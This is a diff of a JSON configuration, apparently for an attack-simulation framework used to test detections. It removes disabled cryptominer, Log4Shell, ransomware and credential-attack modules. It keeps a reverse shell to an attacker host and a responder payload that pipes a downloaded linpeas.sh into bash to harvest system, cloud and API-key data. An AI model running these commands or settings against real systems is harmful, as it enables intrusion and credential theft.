@@ -8,136 +8,20 @@
       "enabled": true,
       "osconfig" : {
         "target": {
-          "drop": {
-            "malware": {
-              "eicar": { 
-                "enabled": false,
-                "eicar_path": "/tmp/eicar"
-              }
-            }
-          },
           "connect": {
-            "badip": {
-              "enabled": false,
-              "iplist_url": "https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/firehol_level2.netset"
-            },
-            "nmap_port_scan": {
-              "enabled": false,
-              "nmap_scan_host": "portquiz.net",
-              "nmap_scan_ports": [80,443,23,22,8080,3389,27017,3306,6379,5432,389,636,1389,1636]
-            },
-            "oast": {
-              "enabled": false
-            },
-            "codecov": {
-              "enabled": false,
-              "use_ssl": false,
-              "git_origin": "git@git.localhost:repo/repo.git",
-              "env_secrets": ["SECRET=supersecret123"]
-            },
             "reverse_shell": {
               "enabled": true,
               "host_ip": "attacker-public-1-attacker-${ deployment }.${ dynu_dns_domain }"
             }
-          },
-          "listener": {
-            "port_forward": {
-              "enabled": false,
-              "port_forwards": []
-            }
-          },
-          "execute": {
-            "docker_cpu_miner": {
-              "enabled": false,
-              "nicehash_image": "a2ncer/nheqminer_cpu:latest",
-              "nicehash_name": "nicehash",
-              "nicehash_server": "equihash.usa.nicehash.com:3357",
-              "nicehash_user": "${ attacker_context_cloud_cryptomining_ethermine_wallet }",
-              "minergate_name": "minerd",
-              "minergate_image": "mkell43/minerd",
-              "minergate_server": "stratum+tcp://eth.pool.minergate.com:45791",
-              "minergate_user": "${ attacker_context_host_cryptomining_minergate_user }"
-            }
           }
         },
         "attacker": {
-          "listener": {
-            "http": {
-              "enabled": false,
-              "listen_ip": "0.0.0.0",
-              "listen_port": 8080
-            }
-          },
           "responder": {
             "reverse_shell": {
               "enabled": true,
               "listen_ip": "0.0.0.0",
               "listen_port": "4444",
               "payload": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | tee /tmp/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
-            },
-            "port_forward": {
-              "enabled": false,
-              "listen_port": 8888
-            }
-          },
-          "execute": {
-            "docker_log4shell_attack": {
-              "enabled": false,
-              "attacker_http_port": 8088,
-              "attacker_ldap_port": 1389,
-              "attacker_ip": "attacker-public-1-attacker-${ deployment }.attacker-hub.freeddns.org",
-              "target_port": 8000,
-              "payload": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | tee /tmp/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
-            },
-            "docker_composite_compromised_credentials_attack": {
-              "enabled": false,
-              "protonvpn_user": "${ attacker_context_config_protonvpn_user }",
-              "protonvpn_password": "${ attacker_context_config_protonvpn_password }",
-              "protonvpn_tier": 0,
-              "protonvpn_server": "RANDOM",
-              "protonvpn_protocol": "udp",
-              "wallet": "${ attacker_context_cloud_cryptomining_ethermine_wallet }",
-              "minergate_user": "${ attacker_context_host_cryptomining_minergate_user }"
-            },
-            "docker_composite_cloud_ransomware_attack": {
-              "enabled": false,
-              "protonvpn_user": "${ attacker_context_config_protonvpn_user }",
-              "protonvpn_password": "${ attacker_context_config_protonvpn_password }",
-              "protonvpn_tier": 0,
-              "protonvpn_server": "RANDOM",
-              "protonvpn_protocol": "udp",
-              "wallet": "${ attacker_context_cloud_cryptomining_ethermine_wallet }",
-              "minergate_user": "${ attacker_context_host_cryptomining_minergate_user }"
-            },
-            "docker_composite_defense_evasion_attack": {
-              "enabled": false,
-              "protonvpn_user": "${ attacker_context_config_protonvpn_user }",
-              "protonvpn_password": "${ attacker_context_config_protonvpn_password }",
-              "protonvpn_tier": 0,
-              "protonvpn_server": "RANDOM",
-              "protonvpn_protocol": "udp",
-              "wallet": "${ attacker_context_cloud_cryptomining_ethermine_wallet }",
-              "minergate_user": "${ attacker_context_host_cryptomining_minergate_user }"
-            },
-            "docker_composite_cloud_cryptomining_attack": {
-              "enabled": false,
-              "protonvpn_user": "${ attacker_context_config_protonvpn_user }",
-              "protonvpn_password": "${ attacker_context_config_protonvpn_password }",
-              "protonvpn_tier": 0,
-              "protonvpn_server": "RANDOM",
-              "protonvpn_protocol": "udp",
-              "wallet": "${ attacker_context_cloud_cryptomining_ethermine_wallet }",
-              "minergate_user": "${ attacker_context_host_cryptomining_minergate_user }"
-            },
-            "docker_composite_host_cryptomining_attack": {
-              "enabled": false,
-              "protonvpn_user": "${ attacker_context_config_protonvpn_user }",
-              "protonvpn_password": "${ attacker_context_config_protonvpn_password }",
-              "protonvpn_tier": 0,
-              "protonvpn_server": "RANDOM",
-              "protonvpn_protocol": "udp",
-              "wallet": "${ attacker_context_cloud_cryptomining_ethermine_wallet }",
-              "minergate_user": "${ attacker_context_host_cryptomining_minergate_user }"
             }
           }
         }
